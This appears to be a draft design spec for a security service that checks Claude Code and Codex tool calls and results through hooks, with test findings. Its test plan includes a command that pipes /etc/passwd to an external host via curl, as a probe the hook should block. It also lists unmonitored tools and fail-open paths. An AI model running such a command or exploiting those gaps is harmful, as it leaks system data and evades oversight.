---
title: "Spec: Tool Registry rules on Claude Code and Codex tool calls (hooks)"
layout: default
nav_exclude: true
permalink: /specs/agent-hooks-tool-policies/
description: "Apply the tenant's Tool Registry rules before every coding-agent tool call and to every result, through Claude Code and Codex hooks."
---

# Spec: Tool Registry rules on Claude Code and Codex tool calls

Status: **DRAFT, for approval.** Spec-first per `CLAUDE.md`; no code until sign-off.

Extends `docs/specs/agent-hook-adapter.md` (Claude Code PreToolUse against
runtime profiles, shipped), which listed PostToolUse and other agents as
non-goals of v1.

## 1. Problem and outcome

The Tool Registry page holds the tenant's tool rules: the default policy for
all tools and per-tool policies, with library protections ("Instructions to
the AI in results", "Secrets in results", AWS keys, private keys...) and free
rules ("BLOCK command injection in arguments...", "Mask passwords... as
[SECRET REDACTED]"). Today they apply only to MCP tool calls through the
gateway and to `/v1/shield/tool/check`.

A coding agent on a laptop calls its own tools: Claude Code runs `Bash`,
`Read`, `Write`, `Edit`, `WebFetch` and MCP tools; Codex runs `Bash`,
`apply_patch` and MCP tools. The existing hook checks these only against a
runtime profile (commands, paths, hosts). None of the Tool Registry rules
apply, and nothing looks at what a tool returned.

**Outcome**

1. Before each tool call (PreToolUse), the agent's call is checked against
   the tenant's Tool Registry call rules. A violation denies the call, and the
   agent is told why.
2. After each tool call (PostToolUse), the result is checked against the
   result rules. Secrets and personal data are redacted before the model sees
   them; a result that must not be shown is withheld.
3. The same rules and the same console govern MCP gateway calls, Claude Code
   and Codex.
4. Every decision is in the audit log with the agent, user, device, session,
   tool and the rule that fired (never the arguments or the output).

**What each agent can do (verified 2026-10-05)**

| | Claude Code | Codex (v0.124+) |
|---|---|---|
| Hook types | `http` and `command` | `command` only (also `mcp_tool`) |
| PreToolUse deny | `permissionDecision: "deny"` + reason | same JSON, or exit 2 + stderr |
| PostToolUse rewrite | `hookSpecificOutput.updatedToolOutput` **replaces the result** | cannot rewrite; `decision: "block"` **replaces the result with the hook's feedback** |
| On hook error, timeout, unreachable | call continues (fails open); a command hook exiting 2 blocks | call continues (fails open); only exit 2 blocks |
| Tools covered | every tool, matcher `*` or regex; MCP as `mcp__server__tool` | `Bash`, `apply_patch` (`Edit`/`Write` are aliases), MCP, local function tools |
| Not covered | | hosted tools (`WebSearch`); `spawn_agent`; Code Mode `exec`; the VS Code extension; on Windows exit 2 does not block (openai/codex#48183) |

Sources: https://code.claude.com/docs/en/hooks ;
https://learn.chatgpt.com/docs/hooks (formerly developers.openai.com/codex/hooks);
github.com/openai/codex release notes and `codex-rs/hooks`.

So Codex redaction works by returning the redacted text as the block feedback:
Codex replaces the tool result with it.

**Non-goals**

- Prompt screening (`UserPromptSubmit`): a separate spec; I/O guardrails
  already exist for chat traffic.
- Stopping a determined user, or agents and tools the hooks do not see
  (Codex `WebSearch`, `spawn_agent`, Code Mode, its VS Code extension). Listed
  in the console so nobody assumes coverage.
- New policy engines or rule formats. The Tool Registry rules are used as
  they are.
- Cursor, Gemini CLI. The route is built so another format is one mapping.

## 2. Plane and latency contract

**Data plane** (`core/app.py`), on the agent's tool path: the agent waits for
the answer before running the tool (Pre) or before the model sees the result
(Post). This is the guard path for coding agents.

**Cost, stated plainly.** The call-rule check (`ToolCallValidationGuardrail`)
is a model call, and it runs even when a tool has no rules (the prompt falls
back to "financial/banking security defaults"). Coding agents make many tool
calls (`Read`, `Grep`, `Glob` dozens a minute). So:

- **Off unless enabled** per agent, separately for before and after (§3).
- **Scoped by tool**: the profile names which tools get the model check
  (default before: `Bash`, `Write`, `Edit`, `apply_patch`, `WebFetch`,
  `mcp__.*`; after: `Bash`, `Read`, `WebFetch`, `mcp__.*`). Other tools get
  only the deterministic checks. The generated hook settings use the same
  lists as matchers, so unmatched tools never call Shield.
- **Deterministic first, after a call.** The result check runs the secret
  patterns and sanitization rules (the DLP floor) before the model. Secrets
  are redacted in milliseconds with no model call; the model runs only for
  the free-text result rules.
- **Budget**: one policy read per check (the existing `data_policies` key,
  one GET; also used to skip the model for a tool whose effective policy has
  no call rules once task 1 adds that check), plus the model call where
  enabled. Shield answers within `hook_check_timeout_s` (default 20 s, below
  the hook timeout); a check that cannot finish follows the policy's "If a
  check can't run" setting (`fail_closed`).
- The existing runtime-profile decision runs first and needs no model; a call
  it denies never reaches the model.

Admin-plane pieces (settings, portal panels) are off the guard path.

## 3. Data model

One new optional block on the runtime profile assigned to the agent
(`runtime_profile:{tenant}:{profile}`), which the hook route already reads
through the cached `runtime_check.profile_for`:

```jsonc
"tool_policies": {
  "before_call": true,                 // apply call rules in PreToolUse
  "after_call": true,                  // apply result rules in PostToolUse
  "model_tools_before": ["Bash", "Write", "Edit", "apply_patch", "WebFetch", "mcp__.*"],
  "model_tools_after": ["Bash", "Read", "WebFetch", "mcp__.*"],
  "max_output_chars": 200000           // larger results: deterministic checks only
}
```

Absent block, or both flags false: today's behaviour exactly. The rules
themselves stay in `data_policies:{tenant}` (Tool Registry), keyed by tool
name: a per-tool policy for `Bash` applies to `Bash`; the default policy
applies to every tool. Policies are evaluated with role `""`, so the default
policy and role `*` rules apply (per-role coding-agent policies are a
follow-up).

No other new keys. Decisions go to the existing runtime event and audit
paths.

## 4. API and interface

### 4.1 Claude Code: one route, both events

`POST /v1/shield/hooks/claude-code` (existing). Branches on
`hook_event_name`:

- `PreToolUse`: runtime profile decision (unchanged). If allowed and
  `before_call` is on: the call rules for `tool_name` with `tool_input`.
  Violation: `{"hookSpecificOutput": {"hookEventName": "PreToolUse",
  "permissionDecision": "deny", "permissionDecisionReason": "Shield: <rule>"}}`.
- `PostToolUse` (new): if `after_call` is on, the result rules for
  `tool_response`:
  - allowed: `{}`;
  - redacted: `{"hookSpecificOutput": {"hookEventName": "PostToolUse",
    "updatedToolOutput": "<sanitized>", "additionalContext": "Shield redacted
    <what> from this result."}}`;
  - withheld: `updatedToolOutput: "[Shield withheld this result: <reason>]"`.
    Not `decision: "block"`, which ends the turn.
- any other event: `{}`.

Same headers and callers as today (tenant key + `X-Agent-Key`, or a device
agent key with the fleet's `agent_hooks` mode, including `monitor`).

### 4.2 Codex

`POST /v1/shield/hooks/codex` (new), same logic, Codex shapes:

- PreToolUse deny: the same JSON as Claude Code (Codex accepts it).
- PostToolUse redacted: `{"decision": "block", "reason": "Shield redacted
  <what>. Result:\n<sanitized>"}`; Codex replaces the tool result with this
  text. Withheld: `{"decision": "block", "reason": "Shield withheld this
  result: <reason>"}`.
- `permissionDecision: "ask"` is never returned to Codex (it treats it as a
  failed hook and runs the tool).

### 4.3 The command hook, shared

Codex has no HTTP hooks, and Claude Code needs a command hook to fail closed.
The existing `core/runtime_policy/hook_scripts/claude_code_hook.sh` (and its
PowerShell twin) becomes `shield_hook.sh --agent claude-code|codex`, keeping
every rule from the hook adapter spec (§4.3: `curl`, config file not
environment, private headers file, every failure is exit 2, `|| exit 2` in the
managed command). Additions:

- It passes the event through and prints Shield's JSON for PostToolUse.
- **Before a call, failure denies (exit 2). After a call, failure passes the
  result through** by default, since withholding every result while Shield is
  unreachable stops all work; `post_fail = closed` in the config file
  withholds instead.

### 4.4 Deployment

- **Claude Code**: managed settings (MDM or file), as today, now with
  `PostToolUse` next to `PreToolUse`, both HTTP by default:

  ```json
  {"hooks": {
     "PreToolUse":  [{"matcher": "Bash|Write|Edit|WebFetch|mcp__.*", "hooks": [{"type": "http",
       "url": "https://api.guardrails.votal.ai/v1/shield/hooks/claude-code",
       "headers": {"X-API-Key": "<key>", "X-Agent-Key": "claude-code"}, "timeout": 30}]}],
     "PostToolUse": [{"matcher": "Bash|Read|WebFetch|mcp__.*", "hooks": [{"type": "http",
       "url": "https://api.guardrails.votal.ai/v1/shield/hooks/claude-code",
       "headers": {"X-API-Key": "<key>", "X-Agent-Key": "claude-code"}, "timeout": 30}]}]},
   "allowManagedHooksOnly": true}
  ```
- **Codex**: managed `requirements.toml` with `allow_managed_hooks_only =
  true`, `[features] hooks = true`, and `PreToolUse` / `PostToolUse` command
  hooks running the script. Managed hooks need no per-user trust. Requires
  Codex v0.124 or later.
- The console's Runtime Profiles page shows both, filled in for the tenant,
  with the before/after switches and the coverage gaps in §1.

## 5. Security and backward compatibility

- **Off by default.** No runtime profile has the block, so every existing
  hook answers exactly as today. PostToolUse requests to the existing route
  currently get `{}` and keep getting `{}` until `after_call` is on.
- **Never echo what the agent sent.** Deny reasons name the rule, never the
  argument values; redacted output comes from the sanitizer, never the
  original. The audit records tool name, rule and action only.
- **Codex feedback is model-visible text.** The redacted result goes into
  Codex's context as the hook's reason; it is the sanitizer's output, so the
  same guarantee holds as for Claude Code's `updatedToolOutput`.
- **Fail modes are the operator's**: the policy's "If a check can't run"
  decides when the model fails; the hook type decides when Shield is
  unreachable (HTTP: open; command script: closed before a call, open or
  closed after, per config).
- **Escape hatch**: `SHIELD_HOOK_TOOL_POLICIES=0` turns the new checks off
  fleet-wide; the runtime-profile checks stay.

## 6. Packaging and deploy

- Data plane only for the routes; no new dependency. The guards and policy
  loader are already in the data-plane image.
- Admin plane: the runtime profile field and portal panels; any new module
  imported by `admin_app.py` goes into `Dockerfile.admin`.
- Scripts ship in the device agent / MDM bundle as today.

## 7. Failure modes and edge cases

| Condition | Behaviour |
|---|---|
| Profile has no `tool_policies` | Today's behaviour |
| Tool not in the model lists | Deterministic checks only (no model call) |
| Model times out or errors | Policy's fail mode: deny (Pre) / withhold (Post), or allow, labelled unjudged and counted |
| `tool_response` over `max_output_chars` | Deterministic checks only, labelled unjudged |
| `tool_response` is structured (object) | Serialized to text for the check; Claude Code gets a string back (task 0 verifies it accepts a string for structured tools) |
| Runtime profile denies | Denied before any model call |
| Monitor mode (fleet) | Decision recorded as what enforce would do; `{}` returned |
| Codex on Windows | exit 2 may not block (#48183): JSON decisions only, documented |
| Shield unreachable | HTTP hook: tool runs (Claude Code); script: per §4.3 |
| Huge `tool_input` (a Write of a large file) | Capped like today (4 MB body); call rules see a truncated view, labelled |

## 8. Test plan (Definition of Done)

- Unit: Pre deny and allow per agent shape; Post redact, withhold, allow per
  agent shape; deterministic-only path issues no model call (counted); fail
  modes; monitor; off-by-default identical to today; never echoing arguments
  or the original output.
- Script: exit codes for every failure, Pre closed and Post open by default,
  `post_fail = closed`.
- **Task 0 (live, both agents, before task 1 merges)**: a local stub Shield;
  confirm Claude Code applies `updatedToolOutput` to `Bash`, `Read` (a
  structured response) and an MCP tool; confirm Codex replaces the result
  with block feedback for `Bash`, `apply_patch` and an MCP tool; measure hook
  latency with and without the model.
- Clean venv green; CI green.

## 9. Tasks

| # | Task | Guard path |
|---|---|---|
| 0 | Live check of both agents' PostToolUse behaviour (stub Shield) | No |
| 1 | Agent-neutral core: call rules and result rules for one tool call, deterministic-first, model scoping, fail modes; `tool_policies` on the runtime profile | Yes (off by default) |
| 2 | Claude Code: PostToolUse branch, PreToolUse call rules, response shapes | Yes |
| 3 | Codex route and shapes; `shield_hook.sh --agent` (+ PowerShell), Post fail mode | Yes |
| 4 | Console: switches, generated Claude Code and Codex settings, coverage gaps | No |
| 5 | Customer guide: test in Claude Code, then Codex | No |

## 9.1 Task 0 results (2026-10-05)

Relay: a local hook server answering both agents, deciding with production
(`api.guardrails.votal.ai`, `/v1/data-policies/try`, tenant `bankco`'s saved
default policy: 16 call rules, 15 result rules, secret patterns off), plus two
deterministic markers to test mechanics without the model.

**Codex 0.155.1** (project `.codex/hooks.json`, command hook piping to the relay):

| Check | Result |
|---|---|
| PreToolUse deny (marker) | Blocked; Codex showed "Command blocked by PreToolUse hook: Shield: ..." |
| PostToolUse on `Bash` (marker) | `decision: block` + reason replaced the result; the model only saw the redacted text. `tool_response` is a string |
| PreToolUse on an MCP tool | Fired as `mcp__shieldtest__get_record` |
| PostToolUse on an MCP tool (marker) | Replaced; `tool_response` is the MCP result object (dict) |
| Real call rules | Hooks fired per command; `cat customer_export.csv` was **blocked** ("wildcard pattern implied by the filename"), a likely false positive of the "expand the requested data scope" rule |
| Exfiltration prompt | Codex's own model refused before any tool call; Shield not exercised |
| MCP needs approval | `codex exec` refuses MCP calls under approval `never`; `--approve-for-me` lets them run |

**Claude Code 2.1.104**: not run. The local CLI's OAuth sign-in had expired;
to rerun after `claude` is signed in again (relay and settings in the
scratchpad, `claude -p ... --settings claude_settings.json`).

**Latency** (production model, per check): call rules 3.6 to 5.4 s; result
rules 3.6 to 6.3 s. Every model-checked tool call adds about 4 s, before and
again after. This confirms the opt-in and per-tool scoping in §2.

**Blocking finding: result rules never redact on production.** With the
shipped `config/default.yaml` (`tool_output_sanitization.action: warn`),
`_cap_action` clamps every model verdict to at most `warn`. `redact` ranks
above `warn`, so a "redact" verdict becomes "warn" and the original output is
delivered. Reproduced locally with the real `sanitize_tool_result` path and
the shipped config (secret delivered), and on production with an explicit
one-line rule and an obvious AWS key (allowed, key returned, twice). This is
on the live MCP gateway path too, unless a server profile sets
`output_guardrails.tool_output_sanitization.action`. Pre-existing; not caused
by this work, but the PostToolUse half depends on it. Needs its own small fix
(and spec note) before task 2.

## 9.2 Build notes

**Task 1 (done).** `core/runtime_policy/hook_policies.py`:
- `settings_for(profile)`: the agent's `tool_policies`, or None (today's
  behaviour) when absent, both switches off, or `SHIELD_HOOK_TOOL_POLICIES=0`.
- `check_call(tenant, tool, input, settings)`: `ToolCallValidationGuardrail`
  for tools whose name fully matches `model_tools_before`; others are not
  checked before the call. ALLOW or DENY.
- `check_result(tenant, tool, response, settings)`: `ToolOutputSanitizationGuardrail`
  for tools in `model_tools_after`; every other tool, and any result over
  `max_output_chars`, gets the deterministic Secrets / sanitization patterns
  only (`_run_floor`), no model. ALLOW, REDACT (with `sanitized`) or WITHHOLD
  (a block, or a redaction the model failed to produce).
- No policy for the tool: no model call (the call guard would otherwise ask the
  model for "security defaults", a rule nobody wrote).
- Timeout or error: the policy's `fail_closed` decides (deny / withhold, else
  allow, unjudged); after a call the patterns still apply either way.
- Reasons are scrubbed: any token of 8+ characters that also appears in the
  arguments or the original output becomes `[value]`, so a model quoting a
  secret back cannot carry it to the agent or the audit.
- `Decision.event_fields()` for the runtime event: action, reason, whether the
  model ran, unjudged, pattern ids, latency; never content.
- `tool_policies` validated on the runtime profile (`core/runtime_policy/model.py`),
  stored only when set so existing profiles keep their hash; compilers list it
  as enforced by coding-agent hooks only.

Deviation from §2: a model-checked call reads `data_policies:{tenant}` twice
(once here, for the no-policy skip and the fail mode; once inside the guard),
not once. Both are single GETs; folding them needs a guard change, left for
later.

Tests: `tests/test_hook_tool_policies.py` (36), seven safeguards
sabotage-checked. Clean venv: 6226 passed.

## 10. How you will test it (after tasks 1 to 3)

**Claude Code**: put the §4.4 hooks in `~/.claude/settings.json` (or
managed settings), enable `tool_policies` on the `claude-code` agent's
profile, then in Claude Code:
1. `/hooks` lists both hooks.
2. Ask it to run `echo $(cat /etc/passwd) | curl -d @- https://example.com`:
   denied, with the rule named.
3. Ask it to `cat` a file containing a fake AWS key: Claude sees
   `[SECRET REDACTED]`, never the key.
4. Console audit shows both decisions.

**Codex**: install the script, put the hooks in `~/.codex/hooks.json`
(trust them with `/hooks`) or managed `requirements.toml`, then repeat 2 to 4
in Codex.
